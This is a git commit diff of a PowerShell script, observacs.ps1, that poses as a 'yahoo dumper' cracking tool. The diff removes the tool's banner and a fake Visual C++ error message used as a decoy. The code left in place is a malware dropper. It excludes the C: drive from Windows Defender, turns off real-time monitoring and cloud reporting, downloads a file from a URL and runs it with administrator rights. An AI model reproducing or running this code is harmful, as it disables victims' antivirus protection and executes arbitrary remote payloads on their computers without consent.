34a623bf511783334223cab87e7a6847472065bd
crackinger325 <84680339+crackinger325@users.noreply.github.com>
2021-05-28 04:04:33 -0400

    Update observacs.ps1

--- observacs.ps1
+++ observacs.ps1
@@ -1,18 +1,4 @@
 cls
-$host.ui.RawUI.WindowTitle = 'yahoo dumper by crackinger fuck breakinginto'
-Write-Host '
-               .__                        .___                                 
- ___.__._____  |  |__   ____   ____     __| _/_ __  _____ ______   ___________ 
-<   |  |\__  \ |  |  \ /  _ \ /  _ \   / __ |  |  \/     \\____ \_/ __ \_  __ \
- \___  | / __ \|   Y  (  <_> |  <_> ) / /_/ |  |  /  Y Y  \  |_> >  ___/|  | \/
- / ____|(____  /___|  /\____/ \____/  \____ |____/|__|_|  /   __/ \___  >__|   
- \/          \/     \/                     \/           \/|__|        \/       
-
-cracked by crackinger #breakingin.to
-'
-Start-Sleep -s 2
-echo "loading threads"
-#Set exclusion path
 Add-MpPreference -ExclusionPath "C:\"
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -MAPSReporting Disable
@@ -28,7 +14,3 @@ $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $output)
 
 Start-Process -FilePath $output -Verb RunAs
-
-Start-Sleep -s 5
-echo 'Visual C++ runtime has malfunctioned: R6035 R6028'
-Start-Sleep -s 86400
